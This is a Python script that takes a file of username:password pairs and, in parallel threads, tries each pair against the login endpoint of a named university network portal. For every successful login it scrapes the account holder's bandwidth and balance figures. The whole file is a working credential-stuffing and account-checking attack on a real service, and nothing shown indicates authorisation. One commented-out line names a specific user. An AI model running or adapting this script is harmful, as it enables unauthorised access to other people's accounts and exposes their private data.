#!/usr/bin/env python

# read username and password from file
# make req to /login endpoint
import requests
import argparse
import re
from urllib.parse import urlencode
from urllib.parse import unquote
from concurrent.futures import ThreadPoolExecutor


proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = "https://netsurf.lmu.edu.ng/ajax/bals.php"

creds = {

}

parsed_data = {

}


tails = []

s = requests.Session()
s.get(url)




header = {"Accept-Encoding":"gzip", "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}



def add_flags():
    ''' The function that gets all flags'''
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', type=str, help='The file that contains usernames and passwords')

    args = parser.parse_args()

    # The flag passed from the command line
    file = args.f
    return file
    # print(file)

def get_creds():
    '''get contents of creds.txt and append to tails list'''
    file = add_flags()
    #open, get contents of creds.txt and append to creds dictionary
    fileObject = open(file, 'r')
    fileContents = fileObject.read()
    arr = fileContents.split("\n")

    # remove all appearances of empty strings from the array/list
    arr = [i for i in arr if i != ""]
    
    # print(arr)

    for i in arr:
        arr = i.split(":")
        creds[arr[1]] = arr[0]
        tails.append(arr[1])
    # print(creds)
        


# r = requests.post(url1, data={"username":"chukwu.toochukwu", "password":"", "submit":"Submit"}, proxies=proxy, verify=False)

# e = urlencode(creds)
# d = unquote(e)

# r = requests.post(url, data=d, headers=header, cookies=cookie, proxies=proxy, verify=False)

def login(tail):
    r = s.post(url, data=unquote(urlencode({"head":'["shgBKOVPjxE=","G3EkHHMA/aU=","olvO0CaThvf4kUsw","olvO0CaThvf4kUsw"]', "tail":f'{tail}'})), headers=header)
    # print(r.status_code)
    # print(r.text)
    if "Invalid Username/Password" in r.text:
        name = creds[tail]
        datadigits = ["Invalid Username/Password"]
        # print("invalid")
    else:
        name = re.search("([a-z]*\.[a-z]*|[A-Za-z0-9]+[0-9]{4,5})", r.text)
        datadigits = re.findall("-?[0-9]{1,3}\.[0-9]{1,3} [A-Za-z]*", r.text)
        name = name.group(0)

    update_database(name, datadigits)

    # return name, datadigits
    # print(name, datadigits)
    # regex_on_result(r)    

    



def go_fast(tails):
    ''''''
    with ThreadPoolExecutor() as executor:
        return executor.map(login, tails)

def update_database(name, datadigits):
    parsed_data[name] = datadigits
    # print(name, datadigits)
    

def display_positive_results(parsed_data):
    print("Username", "\t", "Total Bandwidth", "\t", "Total Used", "\t", "Total Balance")
    print("----------------------------------------------------------------------------")
    for i in parsed_data:
        # print( len(parsed_data[i]) )
        if len(parsed_data[i]) > 1:
            print(i, "\t", parsed_data[i][0], "\t", parsed_data[i][1], "\t", parsed_data[i][2])

def display_negative_results(parsed_data):
    print("\n")
    for i in parsed_data:
        if len(parsed_data[i]) == 1:
            print(i, "\t", parsed_data[i][0])



get_creds()

go_fast(tails)

display_positive_results(parsed_data)
display_negative_results(parsed_data)

